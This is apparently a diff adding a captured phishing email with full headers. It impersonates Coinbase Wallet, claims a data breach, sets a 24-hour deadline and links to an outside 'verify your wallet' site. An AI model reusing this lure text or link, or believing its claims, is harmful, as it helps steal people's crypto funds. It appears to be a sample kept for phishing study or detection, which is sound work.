@@ -1,0 +1,52 @@
+ARC-Authentication-Results: i=2; mx.google.com;
+       dkim=pass header.i=@orqui.tech header.s=default header.b=EYNWpeVO;
+       spf=pass (google.com: domain of webmaster@orqui.tech designates 207.244.126.150 as permitted sender) smtp.mailfrom=webmaster@orqui.tech;
+       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=orqui.tech
+
+Received: from wa2.us.cpanel.serverhost.name (wa2.us.cpanel.serverhost.name. [207.244.126.150])
+        by mx.google.com with ESMTPS id <REDACTED>.362.2024.08.12.06.11.06
+        for <REDACTED>
+        (version=TLS1_2 cipher=ECDHE-ECDSA-AES128-GCM-SHA256 bits=128/128);
+
+Received: from [146.70.116.123] (port=56600 helo=DESKTOP-FLI84VB) by wa2.us.cpanel.serverhost.name with esmtpsa
+  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.96) (envelope-from <webmaster@orqui.tech>)
+From: Coinbase Wallet <webmaster@orqui.tech>
+Subject: Your wallet is at risk: act immediately
+Message-Id: <REDACTED@mail.orqui.tech>
+To: <REDACTED>
+Sender: webmaster@orqui.tech
+MIME-Version: 1.0
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - wa2.us.cpanel.serverhost.name
+X-AntiAbuse: Original Domain - <REDACTED>
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - orqui.tech
+X-Get-Message-Sender-Via: wa2.us.cpanel.serverhost.name: authenticated_id: webmaster@orqui.tech
+X-Authenticated-Sender: wa2.us.cpanel.serverhost.name: webmaster@orqui.tech
+
+
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+Immediate Action Required!
+
+Dear user,
+
+We recently experienced a data breach on our platform. While we've taken swift action to minimize the impact, it is crucial that all users verify their wallets to prevent future incidents. This verification process is essential to safeguard your funds and ensure your account remains secure.
+Please complete the verification within the next 24 hours. Failure to do so may result in us being unable to guarantee the safety of your assets. In the event of another cyberattack, unverified users may lose access to their funds, and recovery could be impossible.
+To protect your account, click the button below to verify your wallet now. Your cooperation is critical in maintaining the security and integrity of our platform.
+Thank you for your prompt attention to this urgent matter.
+
+[..]
+<a href=3D"https://cbsbirango.net" target=3D"_blank" rel=3D"noopener">
+<strong>Verify Your Wallet</strong></a>
+[..]
+
+Our email address is not stored in your contacts, which means out messages may end up in your spam folder. This may require you to double-click the link to visit our website. In order to not miss important emails and messages, please add our sending-address to your contact list.
+
+Get the latest Coinbase App for your phone
+
+Terms of Service
+
+© Coinbase 2024 Coinbase Bermuda Service Limited Park Place, 55 Par La Ville Road, Hamilton, HM11 Bermuda
+
